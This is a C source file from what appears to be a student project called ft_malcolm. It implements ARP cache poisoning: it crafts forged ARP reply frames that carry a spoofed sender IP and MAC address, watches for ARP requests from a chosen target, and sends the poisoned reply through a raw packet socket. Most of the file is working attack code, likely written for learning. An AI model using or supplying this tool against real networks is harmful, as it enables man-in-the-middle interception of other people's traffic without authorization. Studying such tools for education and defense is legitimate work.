/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   networking.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jragot <jragot@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/09/15 21:21:21 by jragot            #+#    #+#             */
/*   Updated: 2021/12/12 05:07:32 by jragot           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_malcolm.h"

extern struct project g_project;

struct hostent *gethost(const char *name)
{
	struct hostent *host = NULL;
	if ((host = gethostbyname(name)) != NULL)
		return (host);
	else
		printf("Error: %s is not a valid hostname\n", name);
	return (NULL);
}

struct ifaddrs *getinterface(struct ifaddrs *iflist,const char *name)
{
	while (iflist)
	{
		if (ft_strcmp(iflist->ifa_name, name) == 0)
			return (iflist);
		iflist = iflist->ifa_next;
	}
	return (NULL);
}

void	initialize_device(struct sockaddr_ll *device)
{
	ft_memset(device, 0, sizeof(struct sockaddr_ll));
	device->sll_family = AF_PACKET;
	device->sll_ifindex = WLAN0; 	// Check this before submitting project
	device->sll_halen = ETH_ALEN;
	device->sll_protocol = htons(ETH_P_ARP);
	ft_memcpy(device->sll_addr, &g_project.addresses.tmac, ETH_ALEN);
}

unsigned char	*craft_arp(unsigned char *output)
{
	struct ethhdr frame;
	struct arp_ip packet;
	
	ft_memset(&frame, 0, sizeof(frame));
	ft_memset(&packet, 0, sizeof(packet));
	ft_memcpy(frame.h_dest, g_project.addresses.tmac, 6);
	ft_memcpy(frame.h_source, g_project.addresses.smac, 6);
	ft_memcpy(&frame.h_proto, "\x08\x06", 2);
	ft_memcpy(packet.ar_hrd, "\x00\x01", 2);
	ft_memcpy(packet.ar_pro, "\x08\x00", 2);
	packet.ar_hln = 6;
	packet.ar_pln = 4;
	ft_memcpy(packet.ar_op, "\x00\x02", 2); /* ARP REPLY OPCODE */
	ft_memcpy(packet.ar_sha, g_project.addresses.smac, 6);
	ft_memcpy(packet.ar_sip, &g_project.addresses.sip, 4);
	ft_memcpy(packet.ar_tha, g_project.addresses.tmac, 6);
	ft_memcpy(packet.ar_tip, &g_project.addresses.tip, 4);
	ft_memcpy(output, &frame, 28);
	ft_memcpy(output+sizeof(frame), &packet, sizeof(packet));
	return (output);
}

void	arp_reply(struct arp_ip *request)
{
	struct sockaddr_ll device = {0};
	int bytes_sent = 0;
	unsigned char reply_output[42];

	initialize_device(&device);
	printf("\e[31m(ARP REQUEST DETECTED FROM %d.%d.%d.%d)\n", request->ar_sip[0], request->ar_sip[1], request->ar_sip[2], request->ar_sip[3]);
	craft_arp(reply_output);
	printf("------ REPLYING (POISONED): ------\n");
	process_ethernet(reply_output, 42);
	printf("------ END OF REPLY: ------\e[0m\n");
	if ((bytes_sent = sendto(g_project.fd, reply_output, sizeof(reply_output), 0, (struct sockaddr *)&device, sizeof(device)) < 0))
		exit_error("Error sending poisoned response");
	g_project.waiting_for_reply = 0;
}

void	process_arp(unsigned char *buffer)
{
	struct arp_ip *arp = (struct arp_ip *)(buffer);

	buffer += sizeof(struct arphdr);
	printf("\n----ARP PAYLOAD:----\n");
	printf("|-Sender HW address: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", buffer[0], buffer[1], buffer[2], buffer[3], buffer[4], buffer[5]);
	buffer += arp->ar_hln;
	printf("|-Sender IP address: %d.%d.%d.%d\n", buffer[0], buffer[1], buffer[2], buffer[3]);
	buffer += arp->ar_pln;
	printf("|-Target HW address: %.2x:%.2x:%.2x:%.2x:%.2x:%.2x\n", buffer[0], buffer[1], buffer[2], buffer[3], buffer[4], buffer[5]);
	buffer += arp->ar_hln;
	printf("|-Target IP address: %d.%d.%d.%d\n", buffer[0], buffer[1], buffer[2], buffer[3]);
	buffer += arp->ar_pln;
	if (arp->ar_op[0] || (arp->ar_op[1] < 1 || arp->ar_op[1] > 2))
		printf("|-opcode: %.2x (Unknown operation)\n", arp->ar_op[1]);
	else
		printf("|-opcode: %.2x %s\n", arp->ar_op[1], (arp->ar_op[1] == 1) ? "(REQUEST)" : "(REPLY)");
	if (arp->ar_op[0] == 0 && arp->ar_op[1] == 1) /* We check if this is an ARP REQUEST */
		if (memcmp(arp->ar_sip, &g_project.addresses.tip, 4) == 0) /* and if the request is from the target IP... */
			if (memcmp(arp->ar_sha, &g_project.addresses.tmac, 6) == 0) /* and from the target MAC address */
				if (memcmp(arp->ar_tip, &g_project.addresses.sip, 4) == 0) /* and if it's about the IP address to spoof */
						arp_reply(arp);
	printf("------------------------------------\n\n");
}

void	process_ethernet(unsigned char *buffer, ssize_t buflen)
{
	struct ethhdr *eth = (struct ethhdr *)(buffer);

	if (ntohs(eth->h_proto) == ETH_P_ARP)
	{
		printf("\n*** ARP PACKET ***\nRaw frame:");
		print_buffer(buffer, buflen); /* Check this before submitting project */
		printf("(%d bytes read from socket)\n", (unsigned int)buflen);
		printf("\n----ETHERNET HEADER:----\n");
		printf("|-Destination Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",eth->h_dest[0],eth->h_dest[1],eth->h_dest[2],eth->h_dest[3],eth->h_dest[4],eth->h_dest[5]);
		printf("|-Source Address : %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n",eth->h_source[0],eth->h_source[1],eth->h_source[2],eth->h_source[3],eth->h_source[4],eth->h_source[5]);
		printf("|-Protocol : %04x\n",ntohs(eth->h_proto));
		process_arp(buffer+sizeof(struct ethhdr));
	}
}
